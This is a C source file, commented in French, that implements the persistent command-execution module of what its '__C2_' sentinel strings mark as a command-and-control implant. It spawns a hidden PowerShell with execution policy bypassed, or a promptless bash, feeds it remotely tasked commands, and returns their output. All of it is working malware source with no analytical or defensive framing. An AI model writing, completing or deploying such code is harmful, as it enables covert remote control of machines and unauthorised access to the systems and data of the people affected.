/*
 * ============================================================
 *  shell.c - Implementation du shell persistant cross-platform
 *
 *  Windows : powershell.exe -NoLogo -NoProfile -NonInteractive
 *            -ExecutionPolicy Bypass -Command -
 *            > mode stdin pipe, pas d'echo, sortie propre
 *  Linux   : /bin/bash --norc --noprofile
 *            avec PS1='' PS2='' TERM=dumb dans l'environnement
 * ============================================================
 */
#include "platform.h"
#include "config.h"
#include "utils.h"
#include "shell.h"


/* ============================================================
 *  LECTURE AVEC TIMEOUT
 * ============================================================ */

#ifdef PLATFORM_LINUX
/**
 * Lit une ligne depuis un fd avec timeout en millisecondes.
 * Utilise poll() pour eviter tout blocage.
 */
int readline_timeout(int fd, char *buf, size_t buf_size, int timeout_ms) {
    size_t pos = 0;
    int    remaining = timeout_ms;

    while (pos < buf_size - 1 && remaining > 0) {
        struct pollfd pfd = { fd, POLLIN, 0 };
        int wait = remaining > 500 ? 500 : remaining;
        int ret  = poll(&pfd, 1, wait);
        remaining -= wait;

        if (ret <= 0) continue;

        char c;
        ssize_t n = read(fd, &c, 1);
        if (n <= 0) return (int)pos;

        buf[pos++] = c;
        if (c == '\n') break;
    }
    buf[pos] = '\0';
    return (pos > 0) ? (int)pos : -1;
}

#else /* PLATFORM_WINDOWS */

/**
 * Lit une ligne depuis un HANDLE Windows avec timeout.
 * Utilise PeekNamedPipe pour eviter tout blocage.
 */
int readline_timeout_win(HANDLE hRead, char *buf, size_t buf_size, int timeout_ms) {
    size_t pos   = 0;
    DWORD  start = GetTickCount();

    while (pos < buf_size - 1) {
        DWORD elapsed = GetTickCount() - start;
        if ((int)elapsed >= timeout_ms) return (pos > 0) ? (int)pos : -1;

        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) return -1;

        if (avail == 0) { Sleep(30); continue; }

        char  c;
        DWORD nRead = 0;
        if (!ReadFile(hRead, &c, 1, &nRead, NULL) || nRead == 0) return -1;

        buf[pos++] = c;
        if (c == '\n') break;
    }
    buf[pos] = '\0';
    return (int)pos;
}
#endif


/* ============================================================
 *  DEMARRAGE DU SHELL
 * ============================================================ */

/**
 * Demarre le shell persistant et vide la banniere de demarrage
 * via un sentinel d'initialisation (__C2_INIT_READY__).
 */
int shell_start(PersistentShell *sh) {
#ifdef PLATFORM_WINDOWS
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdinRead, hStdoutWrite;

    if (!CreatePipe(&hStdinRead,      &sh->hStdinWrite,  &sa, 0)) return 0;
    if (!CreatePipe(&sh->hStdoutRead, &hStdoutWrite,     &sa, 0)) return 0;

    /* Stdin write et stdout read ne doivent pas etre heritables */
    SetHandleInformation(sh->hStdinWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(sh->hStdoutRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESTDHANDLES;
    si.hStdInput  = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError  = hStdoutWrite;

    ZeroMemory(&sh->pi, sizeof(sh->pi));

    /* -Command - : lit les commandes depuis stdin sans prompt ni echo */
    char cmdline[] = "powershell.exe -NoLogo -NoProfile -NonInteractive "
                     "-ExecutionPolicy Bypass -Command -";

    BOOL ok = CreateProcessA(
        NULL, cmdline, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &sh->pi
    );

    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);

    if (!ok) return 0;

    strncpy(sh->shell_type, "powershell", sizeof(sh->shell_type) - 1);
    sh->alive = 1;

    /* Vide la banniere de demarrage PowerShell */
    char drain_cmd[] = "Write-Host '__C2_INIT_READY__'\n";
    DWORD nw;
    WriteFile(sh->hStdinWrite, drain_cmd, (DWORD)strlen(drain_cmd), &nw, NULL);

    char linebuf[LINE_BUF_SIZE];
    for (int i = 0; i < 50; i++) {
        readline_timeout_win(sh->hStdoutRead, linebuf, sizeof(linebuf), 200);
        if (strstr(linebuf, "__C2_INIT_READY__")) break;
    }
    return 1;

#else /* PLATFORM_LINUX */
    int stdin_pipe[2], stdout_pipe[2];
    if (pipe(stdin_pipe) < 0 || pipe(stdout_pipe) < 0) return 0;

    /* Construit l'environnement : herite du parent mais force PS1/PS2/TERM
     * pour supprimer les prompts fancy (Kali, Ubuntu, Debian, etc.)        */
    int env_count = 0;
    while (environ[env_count]) env_count++;

    char **new_env = malloc((env_count + 5) * sizeof(char *));
    if (!new_env) return 0;

    int j = 0;
    for (int i = 0; environ[i]; i++) {
        if (strncmp(environ[i], "PS1=",  4) != 0 &&
            strncmp(environ[i], "PS2=",  4) != 0 &&
            strncmp(environ[i], "TERM=", 5) != 0) {
            new_env[j++] = environ[i];
        }
    }
    new_env[j++] = "PS1=";
    new_env[j++] = "PS2=";
    new_env[j++] = "TERM=dumb";
    new_env[j]   = NULL;

    pid_t pid = fork();
    if (pid < 0) { free(new_env); return 0; }

    if (pid == 0) {
        /* Processus enfant */
        dup2(stdin_pipe[0],  STDIN_FILENO);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stdout_pipe[1], STDERR_FILENO);
        close(stdin_pipe[0]); close(stdin_pipe[1]);
        close(stdout_pipe[0]); close(stdout_pipe[1]);

        char *args[] = { "/bin/bash", "--norc", "--noprofile", NULL };
        execve("/bin/bash", args, new_env);
        _exit(1);
    }

    /* Processus parent */
    free(new_env);
    close(stdin_pipe[0]);
    close(stdout_pipe[1]);

    sh->fd_stdin_write = stdin_pipe[1];
    sh->fd_stdout_read = stdout_pipe[0];
    sh->pid            = pid;
    strncpy(sh->shell_type, "bash", sizeof(sh->shell_type) - 1);
    sh->alive = 1;

    /* Vide le demarrage bash */
    char drain_cmd[] = "printf '%s\\n' '__C2_INIT_READY__'\n";
    write(sh->fd_stdin_write, drain_cmd, strlen(drain_cmd));

    char linebuf[LINE_BUF_SIZE];
    for (int i = 0; i < 50; i++) {
        readline_timeout(sh->fd_stdout_read, linebuf, sizeof(linebuf), 200);
        if (strstr(linebuf, "__C2_INIT_READY__")) break;
    }
    return 1;
#endif
}


/* ============================================================
 *  CONTR?LE DU SHELL
 * ============================================================ */

/**
 * Verifie si le processus shell est encore actif.
 */
int shell_is_alive(PersistentShell *sh) {
    if (!sh->alive) return 0;
#ifdef PLATFORM_WINDOWS
    DWORD code;
    if (!GetExitCodeProcess(sh->pi.hProcess, &code)) return 0;
    return (code == STILL_ACTIVE);
#else
    if (sh->pid <= 0) return 0;
    return (waitpid(sh->pid, NULL, WNOHANG) == 0);
#endif
}

/**
 * Arrete le shell courant et en demarre un nouveau.
 */
int shell_restart(PersistentShell *sh) {
    sh->alive = 0;
#ifdef PLATFORM_WINDOWS
    if (sh->pi.hProcess) {
        TerminateProcess(sh->pi.hProcess, 0);
        CloseHandle(sh->pi.hProcess);
        CloseHandle(sh->pi.hThread);
    }
    if (sh->hStdinWrite)  CloseHandle(sh->hStdinWrite);
    if (sh->hStdoutRead)  CloseHandle(sh->hStdoutRead);
    ZeroMemory(sh, sizeof(PersistentShell));
#else
    if (sh->pid > 0) {
        kill(sh->pid, SIGTERM);
        sleep_ms(300);
        kill(sh->pid, SIGKILL);
        waitpid(sh->pid, NULL, WNOHANG);
    }
    if (sh->fd_stdin_write  >= 0) close(sh->fd_stdin_write);
    if (sh->fd_stdout_read  >= 0) close(sh->fd_stdout_read);
    memset(sh, 0, sizeof(PersistentShell));
    sh->fd_stdin_write = sh->fd_stdout_read = -1;
#endif
    return shell_start(sh);
}

/**
 * Envoie une chaine brute dans le stdin du shell.
 */
int shell_write(PersistentShell *sh, const char *data) {
    size_t len = strlen(data);
#ifdef PLATFORM_WINDOWS
    DWORD nw;
    return WriteFile(sh->hStdinWrite, data, (DWORD)len, &nw, NULL) ? 1 : 0;
#else
    return (write(sh->fd_stdin_write, data, len) == (ssize_t)len) ? 1 : 0;
#endif
}


/* ============================================================
 *  EXECUTION D'UNE COMMANDE
 * ============================================================ */

/**
 * Execute une commande dans le shell persistant et collecte sa sortie.
 *
 * Mecanisme sentinel :
 *   1. Envoie la commande dans stdin
 *   2. Envoie immediatement un marqueur unique dans stdin
 *   3. Lit stdout ligne par ligne jusqu'a trouver le marqueur
 *   4. Nettoie la sortie (ANSI, prompts, sentinel)
 */
int shell_run(PersistentShell *sh, const char *command,
              const char *task_id, char *out, size_t out_size) {

    if (!shell_is_alive(sh)) {
        if (!shell_restart(sh)) {
            strncpy(out, "[ERREUR] Shell indisponible", out_size - 1);
            return 0;
        }
    }

    /* Construit le sentinel unique pour cette tache */
    char sentinel[64];
    snprintf(sentinel, sizeof(sentinel), "__C2_DONE_%s__", task_id);

    /* Commande d'impression du sentinel selon le shell */
    char sentinel_cmd[128];
    if (strcmp(sh->shell_type, "powershell") == 0)
        snprintf(sentinel_cmd, sizeof(sentinel_cmd), "Write-Host '%s'\n", sentinel);
    else
        snprintf(sentinel_cmd, sizeof(sentinel_cmd), "printf '%%s\\n' '%s'\n", sentinel);

    /* Envoie commande + sentinel en une seule ecriture */
    char full_cmd[4096 + 128];
    snprintf(full_cmd, sizeof(full_cmd), "%s\n%s", command, sentinel_cmd);
    if (!shell_write(sh, full_cmd)) {
        strncpy(out, "[ERREUR] Ecriture stdin echouee", out_size - 1);
        return 0;
    }

    /* Collecte les lignes jusqu'au sentinel.
     *
     * IMPORTANT : on mesure le temps reel ecoule avec time() et non
     * un compteur fictif "timeout -= per_read".
     *
     * Le bug du compteur fictif :
     *   Chaque appel readline_timeout peut revenir en ~1ms si des donnees
     *   sont disponibles (ex: whoami /groups produit 60 lignes rapidement).
     *   Avec "timeout -= 500" par iteration, 60 iterations = compteur a 0
     *   mais seulement 60ms de temps reel ecoule > faux timeout immediat.
     *
     * La correction : comparer time(NULL) au temps de depart.           */
    char   raw[MAX_OUTPUT_SIZE];
    size_t raw_pos  = 0;
    int    found    = 0;
    char   linebuf[LINE_BUF_SIZE];
    time_t t_start  = time(NULL);   /* Temps de depart en secondes */

    while (!found) {
        /* Verifie le timeout en temps reel (CMD_TIMEOUT_MS en ms > secondes) */
        if ((int)(time(NULL) - t_start) * 1000 >= CMD_TIMEOUT_MS) break;

#ifdef PLATFORM_WINDOWS
        int n = readline_timeout_win(sh->hStdoutRead, linebuf, sizeof(linebuf), 500);
#else
        int n = readline_timeout(sh->fd_stdout_read, linebuf, sizeof(linebuf), 500);
#endif

        if (n <= 0) {
            if (!shell_is_alive(sh)) {
                shell_restart(sh);
                strncpy(out, "[ERREUR] Shell interrompu pendant l'execution", out_size - 1);
                return 0;
            }
            continue;
        }

        if (strstr(linebuf, sentinel)) { found = 1; break; }

        if (raw_pos + (size_t)n < MAX_OUTPUT_SIZE - 1) {
            memcpy(raw + raw_pos, linebuf, n);
            raw_pos += n;
        }
    }

    raw[raw_pos] = '\0';

    if (!found) {
        strncpy(out, "[TIMEOUT] Commande interrompue apres 30s", out_size - 1);
        return 0;
    }

    clean_output(raw, sh->shell_type, sentinel);
    strncpy(out, raw, out_size - 1);
    out[out_size - 1] = '\0';

    if (strlen(out) == 0) strncpy(out, "(pas de sortie)", out_size - 1);
    return 1;
}
